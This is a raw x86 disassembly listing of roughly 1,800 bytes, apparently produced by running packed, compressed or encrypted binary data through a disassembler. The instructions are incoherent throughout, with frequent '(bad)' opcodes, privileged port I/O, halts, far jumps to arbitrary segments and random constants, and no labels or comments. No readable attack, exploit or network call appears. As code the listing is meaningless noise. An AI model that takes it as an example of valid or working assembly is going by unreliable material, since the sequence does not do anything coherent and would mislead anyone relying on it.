  416a6d:	dec    esp
  416a6e:	out    dx,al
  416a6f:	bound  edx,QWORD PTR [edx]
  416a71:	sbb    BYTE PTR [ecx],al
  416a73:	jbe    0x416a7e
  416a75:	jp     0x416a77
  416a77:	mov    edx,0x107b51d8
  416a7c:	sbb    BYTE PTR [edx+eiz*1],0x3e
  416a80:	lds    ebx,FWORD PTR [ebx+0x14]
  416a83:	push   ss
  416a84:	xor    eax,0x3be68b6b
  416a89:	jne    0x416a8f
  416a8b:	lahf   
  416a8c:	out    dx,eax
  416a8d:	sti    
  416a8e:	test   al,0x88
  416a90:	adc    edx,DWORD PTR [esi-0x62]
  416a93:	int3   
  416a94:	ss inc esp
  416a96:	jne    0x416a9b
  416a98:	mov    esi,0xf504af16
  416a9d:	mov    cs,WORD PTR [edx+ebp*2+0x34]
  416aa1:	inc    ecx
  416aa2:	stos   DWORD PTR es:[edi],eax
  416aa3:	pusha  
  416aa4:	sub    BYTE PTR [edi-0x9cef731],bl
  416aaa:	mov    esi,0xa108a560
  416aaf:	push   edi
  416ab0:	hlt    
  416ab1:	lods   al,BYTE PTR ds:[esi]
  416ab2:	add    eax,0xfb682b61
  416ab7:	cmp    bl,bh
  416ab9:	imul   ebp,edi,0xab3c458d
  416abf:	xor    eax,0x4022a33e
  416ac4:	jnp    0x416b00
  416ac6:	bound  edx,QWORD PTR [edi]
  416ac8:	xchg   DWORD PTR [edi-0x74166cfb],ecx
  416ace:	mov    DWORD PTR [edi],ebp
  416ad0:	lock and BYTE PTR [ebp-0x2e],0xc7
  416ad5:	pop    es
  416ad6:	cli    
  416ad7:	clc    
  416ad8:	dec    ecx
  416ad9:	jl     0x416b50
  416adb:	add    DWORD PTR [edx],0xffffffed
  416ade:	adc    al,dh
  416ae0:	inc    DWORD PTR [esi]
  416ae2:	(bad)  [edx+eax*2+0x2a3142f8]
  416ae9:	and    ecx,DWORD PTR [ebx]
  416aeb:	pop    eax
  416aec:	(bad)  
  416aed:	push   ebp
  416aee:	ss xor cl,cl
  416af1:	fst    QWORD PTR [ebx]
  416af3:	sub    DWORD PTR [edx],ebx
  416af5:	mov    DWORD PTR [ebx],0xe428080e
  416afb:	mov    bh,BYTE PTR [ebx]
  416afd:	sbb    dl,ch
  416aff:	dec    esi
  416b00:	jne    0x416adc
  416b02:	pop    edi
  416b03:	mov    edi,0x277bb8ba
  416b08:	and    DWORD PTR [ecx+0x7f],eax
  416b0b:	sbb    al,BYTE PTR [edx+eax*2+0x70ac2c98]
  416b12:	mov    bl,bl
  416b14:	adc    cl,BYTE PTR [edi]
  416b16:	pop    eax
  416b17:	or     ecx,DWORD PTR [eax-0x4]
  416b1a:	hlt    
  416b1b:	pusha  
  416b1c:	fbstp  TBYTE PTR [esi-0x7f141093]
  416b22:	push   DWORD PTR [esi]
  416b24:	xchg   DWORD PTR [ebx+0x14],edi
  416b27:	dec    ebx
  416b28:	mov    ds:0x431b19ec,eax
  416b2d:	or     bh,BYTE PTR [esi+0x29]
  416b30:	jmp    0x7ec0:0x7317fa37
  416b37:	and    al,0x50
  416b39:	push   ss
  416b3a:	or     al,BYTE PTR [ebx+0x6f50fee0]
  416b40:	sub    eax,0x5add47e2
  416b45:	mov    WORD PTR [edx+eax*1+0x61],0x813
  416b4c:	pop    edx
  416b4d:	mov    eax,esp
  416b4f:	mov    al,cl
  416b51:	(bad)  
  416b52:	push   eax
  416b53:	cld    
  416b54:	call   0xef67:0xc3b53af8
  416b5b:	pop    esi
  416b5c:	test   esp,0xf889cf89
  416b62:	xchg   edi,eax
  416b63:	stc    
  416b64:	mov    edi,eax
  416b66:	jne    0x416b59
  416b68:	xchg   DWORD PTR [ecx-0x7660f6a5],esi
  416b6e:	lock pushf 
  416b70:	mov    ecx,edx
  416b72:	sub    ebp,eax
  416b74:	mov    DWORD PTR [ebx],edi
  416b76:	mov    dh,0x3e
  416b78:	in     al,0x9a
  416b7a:	shr    DWORD PTR [ebx],cl
  416b7c:	xor    edx,DWORD PTR [edx+0x50]
  416b7f:	add    ecx,DWORD PTR [eax]
  416b81:	addr16 add al,0x6f
  416b84:	and    eax,0xb8a108ef
  416b89:	add    eax,0x66005c0c
  416b8e:	add    BYTE PTR [ebx],0xa2
  416b91:	cmp    ebx,DWORD PTR [ebx]
  416b93:	ins    DWORD PTR es:[edi],dx
  416b94:	fisttp QWORD PTR [edi-0x7eaccb38]
  416b9a:	(bad)  
  416b9b:	sar    bh,0x9d
  416b9e:	(bad)
  416ba2:	ins    BYTE PTR es:[edi],dx
  416ba3:	inc    ecx
  416ba4:	icebp  
  416ba5:	imul   edi,eax,0x6c
  416ba8:	jg     0x416bb3
  416baa:	clc    
  416bab:	repz push ss
  416bad:	(bad)  
  416bae:	frstor [ebx-0x15]
  416bb1:	pop    edi
  416bb2:	lea    ebp,[esi+0x1]
  416bb5:	cmp    ebp,0x7d1507ff
  416bbb:	sub    BYTE PTR [esi+0x76],dl
  416bbe:	push   cs
  416bbf:	loop   0x416b42
  416bc1:	imul   edi,DWORD PTR [edx+0x82d1fa2],0xffffffde
  416bc8:	pextrw ecx,(bad),0xc5
  416bca:	(bad)  
  416bcb:	iret   
  416bcc:	jl     0x416bdd
  416bce:	gs (bad) 
  416bd0:	mov    ecx,ebx
  416bd2:	scas   al,BYTE PTR es:[edi]
  416bd3:	dec    ebp
  416bd4:	test   DWORD PTR [esi],0xddf7330d
  416bda:	add    ebx,ebx
  416bdc:	push   cs
  416bdd:	shl    DWORD PTR [ecx],cl
  416bdf:	mov    edi,DWORD PTR ds:[ebp+0x7ed0ca5]
  416be6:	xor    cl,BYTE PTR ds:0x33027d2f
  416bec:	or     BYTE PTR [ebp+0x7c1ecb72],ah
  416bf2:	adc    bh,bh
  416bf4:	inc    esi
  416bf5:	in     al,dx
  416bf6:	mov    al,0xd5
  416bf8:	push   edx
  416bf9:	nop
  416bfa:	mov    ecx,0xe3fb4504
  416bff:	test   esi,ebx
  416c01:	lock nop
  416c03:	xor    ecx,ecx
  416c05:	push   ecx
  416c06:	and    DWORD PTR [edx+0x3a],edx
  416c09:	or     bh,cl
  416c0b:	cmp    cl,BYTE PTR [edx+0x1]
  416c0e:	retf   
  416c0f:	outs   dx,DWORD PTR ds:[esi]
  416c10:	sbb    ecx,ebx
  416c12:	pop    ebx
  416c13:	add    al,0x2
  416c15:	je     0x416c22
  416c17:	add    esp,DWORD PTR [ebp-0x7d]
  416c1a:	mov    edx,0xc742e8eb
  416c1f:	push   cs
  416c20:	out    dx,eax
  416c21:	outs   dx,DWORD PTR ds:[esi]
  416c22:	add    BYTE PTR [ecx-0x2ed6a52f],cl
  416c28:	jmp    0x2d70cf5b
  416c2d:	push   edx
  416c2e:	out    0xae,al
  416c30:	imul   ebx,ebx,0x66
  416c33:	cmp    esi,DWORD PTR [eax]
  416c35:	and    BYTE PTR [esp+ebp*1],al
  416c38:	pop    ss
  416c39:	add    eax,0x8b0e7404
  416c3e:	int    0xb6
  416c40:	mov    edi,0xeb083306
  416c45:	in     al,0x4
  416c47:	add    al,BYTE PTR [edx]
  416c49:	cmp    DWORD PTR [edx],edi
  416c4b:	lock in al,dx
  416c4d:	xchg   ebx,eax
  416c4e:	pop    ebp
  416c4f:	cmp    ebp,DWORD PTR ds:0x420a8a44
  416c55:	dec    ecx
  416c56:	nop
  416c57:	push   edi
  416c58:	aam    0x42
  416c5a:	pop    esp
  416c5b:	mov    eax,0x88d78928
  416c60:	repnz scas al,BYTE PTR es:[edi]
  416c62:	mov    esp,0x9b185bd1
  416c67:	mov    ebp,0x5f58c16d
  416c6c:	sbb    BYTE PTR [edi+0x5],bl
  416c6f:	loope  0x416c6d
  416c71:	aaa    
  416c72:	mov    edx,0x382c1e37
  416c77:	int    0x40
  416c79:	cld    
  416c7a:	ret    
  416c7b:	sbb    DWORD PTR [edi],edi
  416c7d:	inc    edx
  416c7e:	mov    ecx,0xa3978181
  416c83:	mov    ds:0xd0adc1fd,al
  416c88:	pop    ss
  416c89:	push   cs
  416c8a:	mov    edi,DWORD PTR [ecx+0x51]
  416c8d:	push   esi
  416c8e:	cld    
  416c8f:	add    edx,edi
  416c91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c92:	mov    ah,BYTE PTR [ecx-0x139de893]
  416c98:	mov    edi,0x13124e8b
  416c9d:	adc    esi,eax
  416c9f:	(bad)  
  416ca0:	push   ebp
  416ca1:	mov    esp,0x1c16f317
  416ca6:	stc    
  416ca7:	iret   
  416ca8:	cs mov cl,0xf9
  416cab:	mov    esi,0x60416143
  416cb0:	cmp    edx,DWORD PTR [eax]
  416cb2:	fidivr DWORD PTR [ebx]
  416cb4:	or     ch,ch
  416cb6:	retf   0xd68e
  416cb9:	mov    ebx,0x3c2c8e8a
  416cbe:	jno    0x416cee
  416cc0:	mov    WORD PTR [eax],ds
  416cc2:	add    eax,0xd357fc2e
  416cc7:	mov    esi,ecx
  416cc9:	int3   
  416cca:	inc    ebx
  416ccb:	cld    
  416ccc:	xor    al,0xb4
  416cce:	iret   
  416ccf:	pop    eax
  416cd0:	retf   0xc731
  416cd3:	push   ss
  416cd4:	pop    ebx
  416cd5:	dec    ebx
  416cd6:	mov    dh,0x89
  416cd8:	cli    
  416cd9:	xor    dh,BYTE PTR [ebp+0x36263b3]
  416cdf:	push   ebx
  416ce0:	push   cs
  416ce1:	pop    eax
  416ce2:	pinsrw mm6,edx,0xfb
  416ce6:	mov    ebx,DWORD PTR [ebp-0x63]
  416ce9:	dec    edi
  416cea:	clc    
  416ceb:	inc    ebp
  416cec:	jo     0x416c77
  416cee:	retf   0x50e9
  416cf1:	mov    edx,ecx
  416cf3:	ret    0x71ad
  416cf6:	and    BYTE PTR [ebx+0x1b],ch
  416cf9:	push   ebx
  416cfa:	xor    edi,edi
  416cfc:	mov    ds:0xe26d5c35,eax
  416d01:	xchg   esp,eax
  416d02:	adc    al,0x4c
  416d04:	or     al,0x39
  416d06:	(bad)  
  416d07:	jns    0x416cb9
  416d09:	inc    edx
  416d0a:	mov    DWORD PTR [ebx],ecx
  416d0c:	cmp    ah,0x4a
  416d0f:	out    dx,eax
  416d10:	add    edx,DWORD PTR ds:0x76e15b02
  416d16:	or     DWORD PTR [ebx],eax
  416d18:	(bad)  
  416d1a:	iret   
  416d1b:	push   cs
  416d1c:	es dec edx
  416d1e:	mov    ds:0xbad44db3,al
  416d23:	push   ecx
  416d24:	pop    ss
  416d25:	jae    0x416ce3
  416d27:	ja     0x416d25
  416d29:	mov    esi,0xa17f6301
  416d2e:	cmp    al,0xcc
  416d30:	aaa    
  416d31:	add    esi,DWORD PTR [edi]
  416d33:	dec    ebx
  416d34:	jmp    0x416d3e
  416d36:	xchg   ecx,eax
  416d37:	push   eax
  416d38:	mov    cl,0x4d
  416d3a:	or     eax,0x9c4417bf
  416d3f:	sbb    BYTE PTR [ecx+0x4f0a1bf2],cl
  416d45:	add    esi,ecx
  416d47:	mov    ecx,ebp
  416d49:	ins    DWORD PTR es:[edi],dx
  416d4a:	adc    al,0xed
  416d4c:	dec    ebx
  416d4d:	jne    0x416d38
  416d4f:	(bad)
  416d52:	out    0x91,al
  416d54:	into   
  416d55:	icebp  
  416d56:	mov    ebx,0x925a4a93
  416d5b:	pop    eax
  416d5c:	lea    esp,[esp+edx*4]
  416d5f:	jmp    eax
  416d61:	(bad)  
  416d62:	das    
  416d63:	xor    al,cl
  416d65:	adc    ch,BYTE PTR [ebp+0x3fc7f102]
  416d6b:	and    DWORD PTR [esi+0x4d79f854],edx
  416d71:	cmp    BYTE PTR [edx+esi*1+0x53],dh
  416d75:	dec    ebx
  416d76:	mov    ds:0x1b4876a4,al
  416d7b:	sub    edx,DWORD PTR [ebx]
  416d7d:	push   eax
  416d7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d7f:	pop    eax
  416d80:	or     BYTE PTR [esi-0x3b],ch
  416d83:	or     edx,DWORD PTR [ebx+0x5f4048e7]
  416d89:	pop    ebx
  416d8a:	mov    eax,edx
  416d8c:	add    esi,ebx
  416d8e:	cdq    
  416d8f:	daa    
  416d90:	push   edi
  416d91:	das    
  416d92:	fcomp  QWORD PTR [eax+0x2d]
  416d95:	mov    ebx,DWORD PTR [eax-0x4]
  416d98:	jns    0x416d6a
  416d9a:	sbb    esi,esp
  416d9c:	jg     0x416dc4
  416d9e:	dec    edx
  416d9f:	jl     0x416dbc
  416da1:	cmp    edx,ebx
  416da3:	jge    0x416dc4
  416da5:	sub    ebx,edx
  416da7:	inc    edi
  416da8:	sbb    DWORD PTR [ecx],edi
  416daa:	fldcw  WORD PTR [edi+0x11]
  416dad:	cmp    esi,DWORD PTR [ebp-0x47fbfee2]
  416db3:	in     al,dx
  416db4:	adc    DWORD PTR [ecx],esi
  416db6:	rol    BYTE PTR [ecx+0x1d],cl
  416db9:	mov    bl,0xe5
  416dbb:	jmp    0x416da2
  416dbd:	mov    ebx,ebp
  416dbf:	adc    bh,dh
  416dc1:	pop    ebx
  416dc2:	mov    eax,ds:0x4acea749
  416dc7:	ds push esi
  416dc9:	daa    
  416dca:	xchg   esp,eax
  416dcb:	jmp    0xc152:0x6f42f0de
  416dd2:	add    al,0xfc
  416dd4:	dec    edi
  416dd5:	jge    0x416de7
  416dd7:	cmp    edi,edx
  416dd9:	jle    0x416ddd
  416ddb:	inc    edi
  416ddc:	mov    eax,0x6bca0970
  416de1:	cld    
  416de2:	js     0x416de5
  416de4:	jmp    0xc0bd:0xc339580e
  416deb:	test   eax,ebx
  416ded:	sub    DWORD PTR [ebx+0x148d931e],ecx
  416df3:	das    
  416df4:	test   al,0x66
  416df6:	adc    dh,BYTE PTR [eax+0x7a]
  416df9:	pop    ebx
  416dfa:	bound  eax,QWORD PTR [ecx]
  416dfc:	cdq    
  416dfd:	mov    bh,0x6c
  416dff:	pop    ebp
  416e00:	sub    al,0xa
  416e02:	ret    0xfde9
  416e05:	out    0x5b,eax
  416e07:	inc    eax
  416e08:	mov    ?,WORD PTR [ebx+0x314e7457]
  416e0e:	jmp    0x416e57
  416e10:	dec    edi
  416e11:	cld    
  416e12:	push   edi
  416e13:	xor    ch,al
  416e15:	out    dx,al
  416e16:	mov    eax,0x1b784afd
  416e1b:	mov    al,BYTE PTR [esi]
  416e1d:	inc    esi
  416e1e:	cmp    DWORD PTR [esi+0x14],edi
  416e21:	test   BYTE PTR [eax],dl
  416e23:	mov    ebx,ecx
  416e25:	sbb    al,0xd1
  416e27:	sub    ah,ch
  416e29:	or     ch,BYTE PTR [esi-0x136261d3]
  416e2f:	pop    edx
  416e30:	xchg   edi,eax
  416e31:	add    DWORD PTR [edx-0x35],edi
  416e34:	push   ebp
  416e35:	push   0x28
  416e37:	aaa    
  416e38:	clc    
  416e39:	sub    eax,edx
  416e3b:	ja     0x416ded
  416e3d:	inc    esp
  416e3e:	in     eax,dx
  416e3f:	and    eax,0x482a8f9e
  416e44:	sub    al,0x74
  416e46:	jmp    0x416df6
  416e48:	and    edx,DWORD PTR [esi+0x23]
  416e4b:	cmp    DWORD PTR [eax+0x52],0x75
  416e4f:	sbb    eax,0x3eba08e6
  416e54:	sub    al,0x6c
  416e56:	out    dx,al
  416e57:	or     DWORD PTR [ebx+0x58f81be0],edx
  416e5d:	outs   dx,BYTE PTR ds:[esi]
  416e5e:	mov    DWORD PTR [ebx+0x4117a1b0],esp
  416e64:	jo     0x416e62
  416e66:	(bad)  
  416e67:	mov    dl,0xeb
  416e69:	sub    BYTE PTR [edi],ah
  416e6b:	inc    ebx
  416e6c:	in     eax,dx
  416e6d:	outs   dx,BYTE PTR ds:[esi]
  416e6e:	mov    eax,DWORD PTR ds:0xaffa6831
  416e74:	cmp    ecx,esi
  416e76:	jl     0x416e48
  416e78:	popf   
  416e79:	inc    ebp
  416e7a:	add    ebp,DWORD PTR [ecx+esi*8+0x3ec34667]
  416e81:	xor    al,0x12
  416e83:	icebp  
  416e84:	sub    dl,BYTE PTR [eax+0x32]
  416e87:	fs xchg ebp,eax
  416e89:	in     al,0xff
  416e8b:	neg    DWORD PTR ds:0x1835781
  416e91:	push   es
  416e92:	push   edx
  416e93:	pop    ss
  416e94:	je     0x416ea5
  416e96:	cmp    edi,DWORD PTR [ebx]
  416e98:	sbb    DWORD PTR [ecx+0x16500eb7],eax
  416e9e:	pop    eax
  416e9f:	stos   DWORD PTR es:[edi],eax
  416ea0:	cmp    eax,DWORD PTR [ecx+0x72aa37b1]
  416ea6:	or     al,0xab
  416ea8:	push   eax
  416ea9:	sbb    al,0x87
  416eab:	and    dx,WORD PTR [eax]
  416eae:	popf   
  416eaf:	call   0xd9e56883
  416eb4:	and    bh,BYTE PTR [ecx+0xa6d57bc]
  416eba:	mov    cl,0x51
  416ebc:	test   al,0x22
  416ebe:	jmp    0x416efc
  416ec0:	pop    edi
  416ec1:	jb     0x416f2f
  416ec3:	jno    0x416e80
  416ec5:	jae    0x416f39
  416ec7:	cmp    esp,0x5deba031
  416ecd:	pop    es
  416ece:	sub    BYTE PTR [eax-0x6b],ah
  416ed1:	pop    ds
  416ed2:	enter  0x327e,0x8c
  416ed6:	jmp    0x416f02
  416ed8:	mov    ecx,0xe4264872
  416edd:	xor    edx,DWORD PTR [eax+ebp*1+0x33]
  416ee1:	push   esp
  416ee2:	mov    ah,0x66
  416ee4:	sti    
  416ee5:	pop    eax
  416ee6:	mov    ebx,0x500c94c9
  416eeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416eec:	shr    al,1
  416eee:	in     eax,0x24
  416ef0:	pop    ss
  416ef1:	int3   
  416ef2:	(bad)  
  416ef3:	pop    edx
  416ef4:	push   DWORD PTR [edx]
  416ef6:	dec    ebp
  416ef7:	aad    0x16
  416ef9:	fs popf 
  416efb:	adc    DWORD PTR [eax-0x70a6b61],edx
  416f01:	or     al,0x93
  416f03:	fild   DWORD PTR [ebx]
  416f05:	or     eax,0x3370011
  416f0a:	call   0xffe8:0x4089d2c0
  416f11:	mov    dl,0x0
  416f13:	mov    esp,0x90f9a2a7
  416f18:	mov    bh,0xba
  416f1b:	mul    BYTE PTR [esi]
  416f1d:	mov    edx,0xde7d0133
  416f22:	pop    es
  416f23:	dec    ebx
  416f24:	cmp    eax,ebx
  416f26:	mov    ah,0xba
  416f28:	jmp    DWORD PTR [edx-0x19]
  416f2b:	fsubrp st(1),st
  416f2d:	push   cs
  416f2e:	xor    eax,0xf83bc32b
  416f33:	cmpps  xmm0,XMMWORD PTR [ebx],0xd2
  416f37:	subps  xmm5,xmm4
  416f3a:	add    eax,0x91084d01
  416f3f:	test   bl,0xd
  416f42:	ret    
  416f43:	mov    ds:0x519b08de,eax
  416f48:	inc    esi
  416f49:	nop
  416f4a:	sbb    eax,0x6b1a8eb1
  416f4f:	sub    DWORD PTR [ebx+0x69e78a1],ecx
  416f55:	pop    ecx
  416f56:	aaa    
  416f57:	or     BYTE PTR [edi+0x7],dh
  416f5a:	enter  0x3b14,0xd8
  416f5e:	inc    ebx
  416f5f:	and    BYTE PTR [ebx],al
  416f61:	leave  
  416f62:	jl     0x416f52
  416f64:	test   eax,0x17148bde
  416f69:	and    eax,0x902b0bc6
  416f6e:	mov    ds:0xc911cec0,eax
  416f73:	jmp    0x416fc8
  416f75:	mov    dh,BYTE PTR [ebx-0x4a42f26c]
  416f7b:	shr    cl,1
  416f7d:	adc    DWORD PTR ds:0xea06117c,eax
  416f83:	inc    esi
  416f84:	xchg   DWORD PTR [eax-0x57],eax
  416f87:	inc    esp
  416f88:	sbb    DWORD PTR [esi],edi
  416f8a:	jecxz  0x416fbf
  416f8c:	add    al,0xa3
  416f8e:	icebp  
  416f8f:	mov    ds:0xe77f19e8,eax
  416f94:	gs ret 
  416f96:	mov    edi,0x7b5b2316
  416f9b:	or     al,0x7
  416f9d:	xor    DWORD PTR [eax],ecx
  416f9f:	ret    
  416fa0:	mov    al,0x42
  416fa2:	push   eax
  416fa3:	sub    al,dh
  416fa5:	adc    al,ch
  416fa7:	outs   dx,DWORD PTR ds:[esi]
  416fa8:	mov    DWORD PTR [edi],ecx
  416faa:	sub    ah,BYTE PTR ds:0x26e0c789
  416fb0:	sbb    DWORD PTR [eax+0x5f0bffc0],ebp
  416fb6:	pop    ds
  416fb7:	mov    dl,BYTE PTR [esi+0x1]
  416fba:	cmp    al,0x49
  416fbc:	and    eax,0x3e740b3c
  416fc1:	cmp    al,0xc
  416fc3:	je     0x417016
  416fc5:	cmp    al,0xd
  416fc7:	mov    ch,0x6d
  416fc9:	mov    dh,0xbf
  416fcb:	xor    DWORD PTR [esi+ecx*1],edi
  416fce:	je     0x417046
  416fd0:	cmp    al,0xf
  416fd2:	sub    al,0x84
  416fd4:	cmp    al,0x11
  416fd6:	pop    es
  416fd7:	mov    ebx,DWORD PTR [eax]
  416fd9:	mov    bh,0xed
  416fdb:	or     BYTE PTR [ecx],bl
  416fdd:	xor    al,0xc2
  416fdf:	inc    edx
  416fe0:	add    DWORD PTR [esi+0x7f],esp
  416fe3:	or     cl,dh
  416fe5:	bnd jge 0x416f9c
  416fe8:	mov    esi,0xf9ffcd10
  416fed:	or     al,0x1c
  416fef:	int    0xc5
  416ff1:	(bad)  
  416ff2:	popf   
  416ff3:	jno    0x416ffc
  416ff5:	xor    esi,DWORD PTR [edi+0x19]
  416ff8:	xor    DWORD PTR [eax-0x5a769115],edi
  416ffe:	adc    bl,bl
  417000:	iret   
  417001:	xor    DWORD PTR cs:[ebx],0x7f3a4d0
  417008:	(bad)  
  417009:	in     eax,dx
  41700a:	div    BYTE PTR [esi-0x55]
  41700d:	aad    0xb9
  41700f:	or     dl,BYTE PTR cs:0xfd2e5c03
  417016:	dec    esp
  417017:	shl    BYTE PTR cs:0x12be5f73,1
  41701e:	sbb    al,0xe8
  417020:	call   0x1d835b82
  417025:	sbb    edx,esp
  417027:	pop    ebx
  417028:	xchg   esi,eax
  417029:	scas   eax,DWORD PTR es:[edi]
  41702a:	not    BYTE PTR ds:0x422bf09c
  417030:	add    al,0x9e
  417032:	mov    ch,0xf6
  417034:	cmp    eax,0xe1c4252
  417039:	sbb    eax,0x6f103910
  41703e:	push   edx
  41703f:	mov    ebp,0xbebf15e
  417044:	std    
  417045:	mov    dl,0xa
  417047:	nop
  417048:	inc    ebx
  417049:	push   ss
  41704a:	or     al,0xcb
  41704c:	add    edx,DWORD PTR [esp+edx*1]
  41704f:	lock xchg edi,eax
  417051:	xchg   BYTE PTR ds:0x418af67f,dh
  417057:	add    DWORD PTR [ebp+0xb6f087c],ecx
  41705d:	sbb    BYTE PTR [eax-0x610390ae],bh
  417063:	fcom   DWORD PTR [ecx+0x3]
  417066:	add    al,0x29
  417068:	shl    DWORD PTR [edx+eax*8+0x56],0xeb
  41706d:	jle    0x41707a
  41706f:	mov    DWORD PTR [eax+eax*4-0x26],esp
  417073:	mov    al,BYTE PTR [edi+0x5b]
  417076:	mov    eax,0x12eb4341
  41707b:	rol    BYTE PTR [eax+0x4311ff9],1
  417081:	jns    0x4170fc
  417083:	jns    0x4170fe
  417085:	or     esi,DWORD PTR [ebp+edi*1+0xc]
  417089:	je     0x4170d4
  41708b:	or     eax,0x740e5574
  417090:	jo     0x4170f8
  417092:	(bad)  [ebx+eax*2+0x24]
  417096:	or     BYTE PTR [eax],0x11
  417099:	mov    BYTE PTR [ecx+0x21],ah
  41709c:	imul   BYTE PTR [eax-0x7b]
  41709f:	enter  0xc789,0x30
  4170a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170a4:	fsub   DWORD PTR [edi-0x5462bf76]
  4170aa:	jmp    0x417129
  4170ac:	adc    bh,ah
  4170ae:	cmp    DWORD PTR [ecx+edi*2],0x31
  4170b2:	fsubr  QWORD PTR [ebp+ecx*4+0x34]
  4170b6:	aam    0xb8
  4170b8:	adc    ch,cl
  4170ba:	or     ecx,DWORD PTR ds:0xeced5b85
  4170c0:	(bad)  
  4170c1:	call   0x4cb66fc8
  4170c6:	pop    ebx
  4170c7:	call   0xa317e2d
  4170cc:	and    esi,DWORD PTR [esi]
  4170ce:	or     BYTE PTR [ecx+0x3b],cl
  4170d1:	pop    ds
  4170d2:	ss pop ecx
  4170d4:	arpl   WORD PTR [edi],dx
  4170d6:	pop    ss
  4170d7:	add    dl,BYTE PTR [ecx-0x29]
  4170da:	cmp    al,0xec
  4170dc:	sbb    BYTE PTR [eax+0x3b],bl
  4170df:	jns    0x4170b9
  4170e1:	and    bl,BYTE PTR [edx+0x3f]
  4170e4:	xchg   esp,eax
  4170e5:	adc    DWORD PTR [edi],ebx
  4170e7:	adc    bh,bh
  4170e9:	add    dl,BYTE PTR [ecx]
  4170eb:	jns    0x417126
  4170ed:	dec    esp
  4170ee:	mov    ds:0x4d08c783,eax
  4170f3:	jne    0x70cac60d
  4170f9:	dec    ebp
  4170fa:	pop    ebp
  4170fb:	pop    ecx
  4170fc:	jmp    0x4d61f274
  417101:	test   al,0x59
  417103:	pop    es
  417104:	jnp    0x4170a1
  417106:	jns    0x41712e
  417108:	sti    
  417109:	add    DWORD PTR [esp+0x14],ebp
  41710d:	mov    cl,BYTE PTR [edi]
  41710f:	test   BYTE PTR [ebx+0x52],0xe4
  417113:	nop
  417114:	xchg   ecx,eax
  417115:	out    0x61,eax
  417117:	jge    0x4170aa
  417119:	pushf  
  41711a:	xor    ah,al
  41711c:	push   cs
  41711d:	sub    al,0x9c
  41711f:	cmc    
  417120:	mov    eax,ds:0xdf7641c9
  417125:	cwde   
  417126:	add    al,0x4d
  417128:	jne    0x417118
  41712a:	push   ss
  41712b:	ss repz xor esp,ebx
  41712f:	xchg   esi,eax
  417130:	sub    eax,0x7aeb3876
  417135:	(bad)  
  417136:	(bad)  
  417137:	adc    edx,DWORD PTR [eax]
  417139:	adc    BYTE PTR [ebp+0x667ba1b7],al
  41713f:	loop   0x417190
  417141:	cwde   
  417142:	cmp    DWORD PTR [edx],eax
  417144:	sbb    al,0x93
  417146:	sub    esi,DWORD PTR [ecx+0x6c]
  417149:	stos   DWORD PTR es:[edi],eax
  41714a:	or     BYTE PTR [ebp+0x4],cl
  41714d:	std    
  41714e:	add    ebx,DWORD PTR [edi]
  417150:	sbb    DWORD PTR [eax],esp
  417152:	inc    ebx
  417153:	lods   al,BYTE PTR ds:[esi]
  417154:	les    edi,FWORD PTR [ebx-0x16]
  417157:	jmp    0x41719e
  417159:	pop    ss
  41715a:	out    0xf8,al
  41715c:	les    ebx,FWORD PTR [ebx+0x6b]
  41715f:	jno    0x4171c4
  417161:	inc    edi
  417162:	add    DWORD PTR [eax+edi*1],ebp
  417165:	add    cl,dl
  417167:	add    ebx,DWORD PTR [eiz*8+0x333c977]
  41716e:	mov    BYTE PTR [ebp+0x3f],ah
  417171:	xchg   esp,eax
  417172:	adc    al,0x13
  417174:	lock push cs
  417176:	xor    edi,DWORD PTR [eax+esi*1-0x5213eaf7]
  41717d:	fs push 0x90927f02
  417183:	mov    al,0x11
  417185:	mov    ebx,eax
  417187:	icebp  
  417188:	adc    edi,esp
  41718a:	add    bh,BYTE PTR [edi]
  41718c:	mul    DWORD PTR [esp]
  41718f:	mov    ecx,eax
  417191:	mov    ah,BYTE PTR [esp+0xc]
  417195:	pop    edx
  417196:	(bad)  
  417197:	cdq    
  417198:	push   0xca089bb0
  41719d:	pop    ecx
  41719e:	pop    ecx
  41719f:	push   esp
  4171a0:	mov    ds:0x2cd161bb,al
  4171a5:	mov    ds:0x4828374a,eax
  4171aa:	xor    DWORD PTR [edx-0x79b48ed3],ecx
  4171b0:	or     BYTE PTR [ebp+0x78c5c003],bl
  4171b6:	jne    0x417201
  4171b8:	xor    eax,DWORD PTR [edi-0x69]
  4171bb:	pop    es
  4171bc:	loopne 0x4171c8
  4171be:	sahf   
  4171bf:	ds jnp 0x4171a6
  4171c2:	imul   ecx,DWORD PTR [ebp-0x71],0xffffffd1
  4171c6:	jbe    0x4171f2
  4171c8:	sbb    ch,BYTE PTR [esi-0xf]
  4171cb:	pop    es
  4171cc:	call   0xd84ef388
  4171d1:	inc    esp
  4171d2:	mov    ebx,DWORD PTR [eax]
  4171d4:	ret    
  4171d5:	sbb    ecx,DWORD PTR [edx]
  4171d7:	pop    es
  4171d8:	mov    al,0xe0
  4171da:	fistp  QWORD PTR [ebp-0x13]
  4171dd:	mov    ch,0x82
  4171df:	sbb    esp,DWORD PTR [ebx+ebx*2]
  4171e2:	push   eax
  4171e3:	dec    eax
  4171e4:	cmp    cl,bh
  4171e6:	xor    edi,edi
  4171e8:	cmp    DWORD PTR [edx+0x7dc6f012],0xffffffe8
  4171ef:	ror    BYTE PTR ds:0x325b6d83,0x38
  4171f6:	xor    al,0x52
  4171f8:	lock iret 
  4171fa:	or     al,bh
  4171fc:	movzx  eax,BYTE PTR [eax+0x1]
  417200:	add    DWORD PTR [edi+0x70],ecx
  417203:	xor    al,0x57
  417205:	in     al,0xba
  417207:	aas    
  417208:	push   eax
  417209:	push   es
  41720a:	iret   
  41720b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41720c:	push   cs
  41720d:	shl    DWORD PTR [esi],0xe0
  417210:	add    esi,edi
  417212:	mov    edi,?
  417214:	out    dx,al
  417215:	xchg   DWORD PTR [ebp-0x1365a100],edi
  41721b:	aam    0x3b
  41721d:	lock je 0x41727f
  417220:	xor    DWORD PTR [esi],0xffffffd8
  417223:	lea    ebp,[ebp+0x10]
  417226:	or     BYTE PTR [ecx+0x8],dl
  417229:	dec    ebp
  41722a:	cmp    DWORD PTR [eax],0xffffffd2
  41722d:	cmp    al,0xdf
  41722f:	pop    es
  417230:	cld    
  417231:	out    0x7,al
  417233:	sub    ah,ah
  417235:	cmp    edi,ebx
  417237:	jle    0x417258
  417239:	out    0x19,eax
  41723b:	pop    ss
